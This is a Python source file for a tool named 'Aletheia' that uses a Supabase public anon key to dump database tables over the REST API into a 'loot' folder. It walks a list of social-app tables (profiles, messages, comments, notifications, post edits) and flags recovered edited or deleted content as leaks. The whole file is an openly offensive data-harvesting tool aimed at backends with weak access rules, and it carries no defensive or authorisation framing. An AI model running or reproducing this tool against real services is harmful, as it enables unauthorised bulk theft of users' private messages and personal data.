import requests
import json
import os
import time

class Aletheia:
    """
    ALETHEIA: The Truth Revealer.
    Module for recovering hidden, deleted, or edited content from Supabase backends.
    """
    def __init__(self, supabase_url, anon_key):
        self.url = supabase_url
        self.key = anon_key
        self.headers = {
            "apikey": self.key,
            "Authorization": f"Bearer {self.key}",
            "Content-Type": "application/json"
        }

    def reveal(self, table_name, limit=1000, output_dir="loot"):
        """
        Dumps a specific table and analyzes it for hidden content (edits/versions).
        """
        print(f"\n[ALETHEIA] Revealing secrets in '{table_name}'...")
        
        # Construct PostgREST URL
        # We avoid ordering by created_at blindly as it might not exist
        url = f"{self.url}/rest/v1/{table_name}?select=*&limit={limit}"
        
        try:
            resp = requests.get(url, headers=self.headers)
            if resp.status_code == 200:
                data = resp.json()
                print(f"  [+] Retrieved {len(data)} records.")
                
                if data:
                    if not os.path.exists(output_dir):
                        os.makedirs(output_dir)
                        
                    filename = os.path.join(output_dir, f"aletheia_{table_name}_dump.json")
                    with open(filename, "w", encoding='utf-8') as f:
                        json.dump(data, f, indent=2)
                    print(f"  [+] Secrets archived to {filename}")
                    
                    # Specific analysis for 'post_edits'
                    if table_name == "post_edits":
                        self._analyze_edits(data)
                    
                    return data
                else:
                    print("  [-] Table is empty.")
                    return []
            else:
                print(f"  [!] Failed: {resp.status_code} - {resp.text}")
                return None
        except Exception as e:
            print(f"  [!] Exception: {e}")
            return None

    def _analyze_edits(self, data):
        print("\n  [ALETHEIA] Analyzing Edit History...")
        leak_count = 0
        for item in data:
            # Check for common content fields
            content = item.get('content') or item.get('text') or item.get('body') or item.get('original_content')
            
            if content:
                leak_count += 1
                if leak_count <= 5:
                    print(f"    [LEAK] Record {item.get('id', '?')}: {content[:60]}...")
        
        print(f"  [+] Total recoverable versions found: {leak_count}")

    def reveal_all(self):
        """
        Iterates through known table names to dump data.
        """
        tables = [
            "post_edits", 
            "post_likes", 
            "follows", 
            "topics", 
            "profiles",
            "posts",
            "comments",
            "messages",
            "notifications"
        ]
        
        for table in tables:
            self.reveal(table)
